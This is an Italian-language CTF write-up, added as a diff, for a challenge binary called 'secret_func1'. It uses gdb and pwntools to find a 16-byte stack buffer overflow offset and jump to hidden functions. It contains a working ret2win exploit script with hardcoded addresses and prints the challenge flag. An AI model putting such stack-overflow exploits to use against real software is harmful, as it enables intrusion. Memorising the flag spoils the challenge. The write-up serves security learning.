@@ -1,0 +1,108 @@
+Iniziamo analizzando l'eseguibile. Intanto notiamo che esistono varie funzioni con nomi particolari aprendo il file con
+
+gdb secret_func1
+
+e lanciando:
+
+info functions:
+
+...
+0x000011ad  super_secret
+0x00001300  super_function
+0x00001450  secret_function
+0x000015aa  super_hidden
+0x00001724  super_senza_piombo
+0x00001877  secret
+0x000019bc  show_element
+0x000019e3  main
+...
+
+Proviamo quindi adesso a sfruttare il buffer overflow menzionato per sovrascrivere l'indirizzo di ritorno e saltare ad una di queste funzioni. Utilizziamo la libreria pwntools per facilitarci il lavoro. 
+
+In [1]: from pwn import *
+In [2]: cyclic(1000)
+Out[2]: b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj'
+
+
+Per generare un payload che ci permetta di capire a che punto finisce il buffer.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x61616165 in ?? ()
+
+In [3]: cyclic_find(0x61616165)
+Out[3]: 16
+
+A quanto pare il buffer è di 16 caratteri.
+
+Adesso proviamo a sovrascrivere l'indirizzo di ritorno e mostrare lo stack
+
+from pwn import *
+offset = 16
+payload = b"A"*offset + b"BBBB"
+r = gdb.debug(["./secret_func1", payload])
+r.interactive() 
+
+
+Dallo screenshot payload.png si può osservare come il payload sia AAAAAAAAAAAAAAAABBBB e l'indirizzo a cui prova a ritornare sia 0x42424242 (=BBBB).
+
+Adesso proviamo a ritornare ai vari indirizzi delle funzioni e vedere cosa succede.
+
+Non possiamo ritornare alla funzione all'indirizzo 0x56556300 (super_function) in quanto contiene \x00, che viene interpretato come fine stringa.
+
+Provando le altre funzioni scopriamo che in output abbiamo:
+
+[>] super_secret
+Ritenta
+
+[>] secret_function
+Casu Marzu
+
+[>] super_hidden
+Sardinia State Sponsored CTF
+
+[>] super_senza_piombo
+Ritenta
+
+[>] secret
+SEC{simple_buffer_overflow_with_secret_7unction}
+
+[>] show_element
+AAAAAAAAAAAAAAAA¼iUV
+
+
+Da cui la flag:
+
+SEC{simple_buffer_overflow_with_secret_7unction}
+
+Script finale:
+
+from pwn import *
+
+# context.log_level = 'debug'
+
+offset = 16
+
+addrs = {
+	"super_secret": 0x565561ad, 
+	"secret_function": 0x56556450, 
+	"super_hidden": 0x565565aa,
+	"super_senza_piombo": 0x56556724,
+	"secret":  0x56556877,
+	"show_element": 0x565569bc
+}
+
+for name in iter(addrs):
+	payload = b"A"*offset + p32(addrs[name])
+	r = process(["./secret_func1", payload])
+	info(name)
+	info(r.recvall())
+
+
+Payload finale:
+
+AAAAAAAAAAAAAAAAwhUV
+
+
+
+
+
